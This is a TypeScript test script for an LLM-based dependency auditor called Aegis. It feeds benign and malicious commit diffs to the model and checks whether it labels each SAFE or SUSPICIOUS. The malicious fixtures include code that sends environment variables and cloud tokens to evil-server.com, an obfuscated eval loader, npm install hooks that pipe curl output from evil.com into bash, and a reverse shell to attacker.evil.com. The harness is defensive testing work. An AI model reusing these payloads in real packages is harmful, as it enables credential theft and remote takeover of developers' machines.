/**
 * Test script for Aegis commit analysis
 * Tests both safe and malicious code patterns to verify the analysis works correctly
 * 
 * Usage: npx ts-node src/test/aegis-analysis.test.ts
 */

import dotenv from 'dotenv';
dotenv.config();

import { getOpenAIClient } from '../lib/openai';

// Test diffs to simulate
const SAFE_DIFF_DOCS = `
diff --git a/README.md b/README.md
index 1234567..abcdefg 100644
--- a/README.md
+++ b/README.md
@@ -1,5 +1,6 @@
 # React DevTools

+## Installation
 
 This package provides the browser extension for debugging React apps.
 
-See the website for instructions.
+See the [website](https://reactjs.org) for installation instructions.
`;

// This is like the React DevTools commit - should be SAFE
const SAFE_DIFF_DEVTOOLS = `
diff --git a/packages/react-devtools-core/src/standalone.js b/packages/react-devtools-core/src/standalone.js
index 1234567..abcdefg 100644
--- a/packages/react-devtools-core/src/standalone.js
+++ b/packages/react-devtools-core/src/standalone.js
@@ -10,6 +10,7 @@ import type {DevToolsHookSettings} from './hook';
 
 export type ConnectOptions = {
   host?: string,
+  componentFilters?: Array<ComponentFilter>,
   useHttps?: boolean,
   port?: number,
   resolveRNStyle?: ResolveNativeStyle | null,
@@ -45,8 +46,10 @@ export function connectToDevTools(options: ?ConnectOptions): void {
   const {
     host = 'localhost',
     useHttps = false,
+    componentFilters,
     port = 8097,
   } = options || {};
+  const componentFiltersString = componentFilters ? JSON.stringify(componentFilters) : 'undefined';

   const protocol = useHttps ? 'https' : 'http';
   
@@ -60,7 +63,7 @@ export function connectToDevTools(options: ?ConnectOptions): void {
     const script = wall.ownerDocument.createElement('script');
     script.textContent = \`
       window.__REACT_DEVTOOLS_ATTACH__ = function(hook) {
-        ReactDevToolsBackend.initialize(undefined, undefined, undefined);
+        ReactDevToolsBackend.initialize(undefined, undefined, undefined, \${componentFiltersString});
       };
     \`;
`;

// This should be SAFE - extension message passing is normal
const SAFE_DIFF_EXTENSION = `
diff --git a/packages/react-devtools-extensions/src/contentScripts/installHook.js b/packages/react-devtools-extensions/src/contentScripts/installHook.js
index 1234567..abcdefg 100644
--- a/packages/react-devtools-extensions/src/contentScripts/installHook.js
+++ b/packages/react-devtools-extensions/src/contentScripts/installHook.js
@@ -5,12 +5,18 @@ import {installHook} from 'react-devtools-shared/src/hook';
 
 function injectCode(code) {
   const script = document.createElement('script');
-  script.textContent = code;
+  script.textContent = \`
+    const componentFilters = \${JSON.stringify(componentFiltersFromSettings)};
+    \${code}
+  \`;
   document.documentElement.appendChild(script);
   script.parentNode.removeChild(script);
 }

 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   if (message.type === 'UPDATE_COMPONENT_FILTERS') {
+    resolveComponentFiltersInjection(message.payload.componentFilters);
     sendResponse({success: true});
   }
 });
`;

const SUSPICIOUS_DIFF_BASE64_EXFIL = `
diff --git a/src/index.js b/src/index.js
index 1234567..abcdefg 100644
--- a/src/index.js
+++ b/src/index.js
@@ -1,10 +1,25 @@
 const config = require('./config');
+const https = require('https');
+const os = require('os');
 
 module.exports = function setup(options) {
+  // Send telemetry
+  const data = Buffer.from(JSON.stringify({
+    env: process.env,
+    user: os.userInfo(),
+    cwd: process.cwd(),
+    npm_token: process.env.NPM_TOKEN,
+    aws_key: process.env.AWS_ACCESS_KEY_ID,
+    home: os.homedir()
+  })).toString('base64');
+  
+  https.get(\`https://evil-server.com/collect?d=\${data}\`);
+  
   return {
     // Normal setup code
     version: config.version,
`;

const SUSPICIOUS_DIFF_EVAL = `
diff --git a/lib/loader.js b/lib/loader.js
index 1234567..abcdefg 100644
--- a/lib/loader.js
+++ b/lib/loader.js
@@ -5,6 +5,15 @@ const path = require('path');
 
 function loadModule(name) {
   const modulePath = path.resolve(__dirname, name);
+  
+  // Dynamic runtime enhancement
+  const _0x2f1a=['YXhpb3M=','RmV0Y2g=','cG9zdA==','aHR0cHM6Ly9tYWxpY2lvdXMuY29t'];
+  (function(_0x12ab) {
+    const decode = (s) => Buffer.from(s, 'base64').toString();
+    const _0x34cd = _0x12ab.map(decode);
+    eval(_0x34cd.join(';'));
+  })(_0x2f1a);
+  
   return require(modulePath);
 }
`;

const SUSPICIOUS_DIFF_PREINSTALL = `
diff --git a/package.json b/package.json
index 1234567..abcdefg 100644
--- a/package.json
+++ b/package.json
@@ -3,7 +3,9 @@
   "version": "1.0.1",
   "main": "index.js",
   "scripts": {
-    "build": "tsc"
+    "build": "tsc",
+    "preinstall": "curl https://evil.com/install.sh | bash",
+    "postinstall": "node -e \\"require('child_process').execSync('whoami > /tmp/out && curl -d @/tmp/out https://evil.com/collect')\\"" 
   },
   "dependencies": {
     "lodash": "^4.17.21"
`;

const SUSPICIOUS_DIFF_REVERSE_SHELL = `
diff --git a/src/utils.js b/src/utils.js
index 1234567..abcdefg 100644
--- a/src/utils.js
+++ b/src/utils.js
@@ -1,4 +1,18 @@
+const net = require('net');
+const { spawn } = require('child_process');
+
+// Debug helper for development
+if (process.env.NODE_ENV !== 'production') {
+  const client = new net.Socket();
+  client.connect(4444, 'attacker.evil.com', function() {
+    const sh = spawn('/bin/sh', []);
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+}
+
 function formatDate(date) {
   return date.toISOString();
 }
`;

async function runAnalysis(diffName: string, diff: string, packageName: string = 'test-package') {
    const openai = getOpenAIClient();

    // Updated prompt to match the one in watchtower.ts
    const prompt = `
You are Aegis, a security auditor for software dependencies. Your job is to detect ACTUAL MALICIOUS CODE, not theoretical vulnerabilities.

CRITICAL: You are analyzing commits from OPEN SOURCE PACKAGES. Most code patterns that seem "dangerous" are actually legitimate:
- Dev tools, browser extensions, and build tools LEGITIMATELY use eval, dynamic code, and script injection
- Configuration injection in settings/preferences is NORMAL, not "XSS"
- Message passing between extension components is EXPECTED behavior
- Dynamic imports and require() are standard patterns

Only flag as SUSPICIOUS if you find CONCRETE evidence of:
- Data exfiltration to external servers (look for URLs to unknown domains)
- Credential/token harvesting (process.env being sent somewhere)
- Obfuscated code with NO legitimate purpose (hex/base64 encoded payloads that decode to malicious code)
- Backdoor installation (reverse shells, unauthorized remote access)
- Malicious install scripts (curl | bash to external URLs)

Do NOT flag:
- Normal code patterns used in dev tools, extensions, or build systems
- Theoretical "what if" vulnerabilities without evidence of exploit
- Template literals or dynamic strings for configuration
- Standard extension message passing

Commit Context:
Package: ${packageName}
Repo: test/test-repo
SHA: abc123

Diff:
\`\`\`diff
${diff}
\`\`\`

RESPONSE FORMAT:
Start with: **SUSPICIOUS** or **SAFE**

If SAFE: One sentence (under 20 words) explaining why.

If SUSPICIOUS: This means you found CONCRETE MALICIOUS CODE (not theoretical risks). Provide:
- Exact file and line with the malicious code
- The suspicious code snippet
- What it actually DOES (not what it "could" do theoretically)
- Evidence this is malicious (e.g., "sends env vars to evil-server.com")
`;

    console.log(`\n${'='.repeat(60)}`);
    console.log(`Testing: ${diffName}`);
    console.log(`${'='.repeat(60)}\n`);

    try {
        const completion = await openai.chat.completions.create({
            model: 'gpt-4-turbo-preview',
            messages: [
                { role: 'system', content: 'You are a helpful and vigilant security assistant.' },
                { role: 'user', content: prompt }
            ],
            temperature: 0.1,
        });

        const analysis = completion.choices[0].message.content;
        console.log('Analysis Result:');
        console.log('-'.repeat(40));
        console.log(analysis);
        console.log('-'.repeat(40));
        console.log(`Length: ${analysis?.length || 0} characters`);

        // Check if it correctly identified SAFE vs SUSPICIOUS
        const isSafe = diffName.includes('SAFE');
        const analyzedAsSafe = analysis?.includes('**SAFE**');
        const status = isSafe === analyzedAsSafe ? '✅ CORRECT' : '❌ INCORRECT';
        console.log(`Verdict Match: ${status}`);

        return { name: diffName, correct: isSafe === analyzedAsSafe, length: analysis?.length || 0 };

    } catch (error: any) {
        console.error('Error:', error.message);
        return { name: diffName, correct: false, length: 0 };
    }
}

async function main() {
    console.log('🛡️ Aegis Analysis Test Suite (v2 - Reduced False Positives)');
    console.log('Testing that legitimate dev tool patterns are marked SAFE\n');

    const tests = [
        { name: 'SAFE - Documentation Update', diff: SAFE_DIFF_DOCS, pkg: 'some-package' },
        { name: 'SAFE - DevTools Config Injection', diff: SAFE_DIFF_DEVTOOLS, pkg: 'react-devtools' },
        { name: 'SAFE - Extension Message Passing', diff: SAFE_DIFF_EXTENSION, pkg: 'react-devtools-extensions' },
        { name: 'SUSPICIOUS - Base64 Data Exfiltration', diff: SUSPICIOUS_DIFF_BASE64_EXFIL, pkg: 'malicious-pkg' },
        { name: 'SUSPICIOUS - Obfuscated Eval Code', diff: SUSPICIOUS_DIFF_EVAL, pkg: 'malicious-loader' },
        { name: 'SUSPICIOUS - Malicious Install Scripts', diff: SUSPICIOUS_DIFF_PREINSTALL, pkg: 'backdoor-pkg' },
        { name: 'SUSPICIOUS - Reverse Shell Backdoor', diff: SUSPICIOUS_DIFF_REVERSE_SHELL, pkg: 'trojan-utils' },
    ];

    const results = [];
    for (const test of tests) {
        const result = await runAnalysis(test.name, test.diff, test.pkg);
        results.push(result);
        // Small delay between API calls
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    console.log('\n' + '='.repeat(60));
    console.log('📊 SUMMARY');
    console.log('='.repeat(60));

    const correct = results.filter(r => r.correct).length;
    console.log(`\nTotal: ${correct}/${results.length} correct`);

    console.log('\n| Test | Result | Length |');
    console.log('|------|--------|--------|');
    for (const r of results) {
        console.log(`| ${r.name} | ${r.correct ? '✅' : '❌'} | ${r.length} chars |`);
    }

    console.log('\n🏁 All tests completed!');
}

main().catch(console.error);
